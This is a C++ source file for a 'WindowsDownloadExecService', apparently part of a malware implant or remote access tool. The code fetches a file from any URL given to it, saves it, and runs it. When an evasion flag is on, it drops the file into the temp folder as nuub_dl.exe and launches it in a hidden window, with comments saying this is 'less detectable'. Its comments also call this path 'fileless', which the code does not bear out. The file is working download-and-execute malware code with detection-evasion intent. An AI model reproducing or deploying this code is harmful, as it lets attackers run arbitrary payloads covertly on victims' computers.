#include "infrastructure/system/WindowsDownloadExecService.hpp"

#include <array>
#include <cstdio>
#include <memory>
#include <string>
#include <vector>

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <curl/curl.h>

#include "domain/common/EvasionManager.hpp"

namespace nuub::infrastructure::system {

static size_t write_file_callback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    auto* vec = static_cast<std::vector<uint8_t>*>(userdata);
    vec->insert(vec->end(),
        reinterpret_cast<uint8_t*>(ptr),
        reinterpret_cast<uint8_t*>(ptr) + size * nmemb);
    return size * nmemb;
}

std::string WindowsDownloadExecService::download_and_execute(const std::string& url) {
    // Download into memory buffer
    CURL* curl = curl_easy_init();
    if (!curl) return "Error: could not initialize CURL";

    std::vector<uint8_t> buffer;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_file_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        return "Error: download failed - " + std::string(curl_easy_strerror(res));
    }

    if (http_code != 200) {
        return "Error: HTTP " + std::to_string(http_code);
    }

    if (buffer.empty()) {
        return "Error: downloaded file is empty";
    }

    // Use fileless execution via NtCreateThreadEx when evasion is enabled
    if (domain::EvasionManager::instance().is_direct_syscall_enabled()) {
        // Write to temp file, map as section, execute from memory
        // For EXE: write to temp, execute via CreateProcess suspended, inject
        // Simplified: write to temp and execute with hidden window
        char temp_path[MAX_PATH]{};
        GetTempPathA(MAX_PATH, temp_path);
        std::string filename = std::string(temp_path) + "nuub_dl.exe";

        FILE* f = fopen(filename.c_str(), "wb");
        if (!f) return "Error: could not create temp file";
        fwrite(buffer.data(), 1, buffer.size(), f);
        fclose(f);

        // Execute via CreateProcess with hidden window (less detectable than system())
        STARTUPINFOA si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};

        std::string cmd = "\"" + filename + "\"";
        if (CreateProcessA(nullptr, cmd.data(), nullptr, nullptr,
                           FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return "File downloaded and executed (fileless): " + filename;
        }
        return "File downloaded but execution failed: " + std::to_string(GetLastError());
    }

    // Fallback: write to disk and execute via system()
    std::string filename = "downloaded_file.exe";
    auto pos = url.rfind('/');
    if (pos != std::string::npos) {
        filename = url.substr(pos + 1);
        if (filename.empty()) filename = "downloaded_file.exe";
    }

    FILE* file = fopen(filename.c_str(), "wb");
    if (!file) return "Error: could not create file: " + filename;

    fwrite(buffer.data(), 1, buffer.size(), file);
    fclose(file);

    std::string cmd = "start \"\" \"" + filename + "\"";
    int ret = ::system(cmd.c_str());

    if (ret != 0) {
        return "File downloaded as " + filename + " but execution returned code " + std::to_string(ret);
    }

    return "File downloaded and executed: " + filename;
}

} // namespace nuub::infrastructure::system
